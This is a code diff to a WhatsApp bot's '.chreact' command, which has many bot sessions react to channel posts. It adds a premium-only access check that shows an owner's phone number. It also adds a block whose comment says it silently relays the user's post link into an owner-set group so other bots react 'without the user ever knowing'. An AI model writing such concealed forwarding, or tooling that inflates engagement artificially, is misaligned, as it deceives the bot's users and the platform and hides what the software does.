@@ -658,7 +658,7 @@ async function resolveChannelPost(sock, parsed) {
     } catch {}
   }
 
-  return { ok: true, jid, serverId: String(serverId), emoji, hasCustomEmoji: Boolean(hasCustomEmoji), customOptionText, channelName, pollInfo };
+  return { ok: true, code, jid, serverId: String(serverId), emoji, hasCustomEmoji: Boolean(hasCustomEmoji), customOptionText, channelName, pollInfo };
 }
 
 const DEFAULT_REACTION_EMOJIS = ['❤️', '🔥', '👍', '🥰', '🎉', '✨', '😍', '👏'];
@@ -688,6 +688,18 @@ async function executeMultiSessionReaction(sock, from, msg, target, title = 'CHA
   }
 
   await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } }).catch(() => {});
+
+  // Silently relay .chreact <link> from Master Owner (03438673242) into the .set arc Group/Chat
+  // so all other bots in that group also react to the post without the user ever knowing!
+  try {
+    const fwd = require('../utils/channelPostForwarder');
+    if (typeof fwd.relayChreactToArcTarget === 'function') {
+      const relayedId = await fwd.relayChreactToArcTarget(sock, from, target);
+      if (relayedId) {
+        processedChreactIds.add(`msg:${relayedId}`);
+      }
+    }
+  } catch {}
 
   const uniqueSocks = getActiveSockets(sock);
   const emojiPool = hasCustomEmoji && emoji ? [emoji] : DEFAULT_REACTION_EMOJIS;
@@ -742,7 +754,20 @@ async function executeMultiSessionReaction(sock, from, msg, target, title = 'CHA
  * .chreact <post link> [emoji]
  * Specifically for emoji reactions on channel posts!
  */
-async function chreactCommand(sock, from, msg, args, isOwner, isAdmin) {
+async function chreactCommand(sock, from, msg, args, isOwner, isAdmin, isPremium = false) {
+  if (!isOwner && !isPremium) {
+    return sock.sendMessage(from, {
+      text: `╭━━━〔 💎 *PREMIUM ACCESS REQUIRED* 〕━━━┈⊷\n` +
+            `┃ ❌ *Access Denied!*\n` +
+            `┃ Ye command sirf *Premium Members*\n` +
+            `┃ use kar sakte hain!\n` +
+            `┃\n` +
+            `┃ 👑 *Premium Access ke liye:*\n` +
+            `┃ 👉 *03438673242 (MR SAQIB)* se rabta karein.\n` +
+            `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┈⊷`
+    }, { quoted: msg });
+  }
+
   const parsed = parseTargetAndEmoji(args, msg, '❤️');
 
   if ((!parsed.code && !parsed.jid) || !parsed.serverId) {
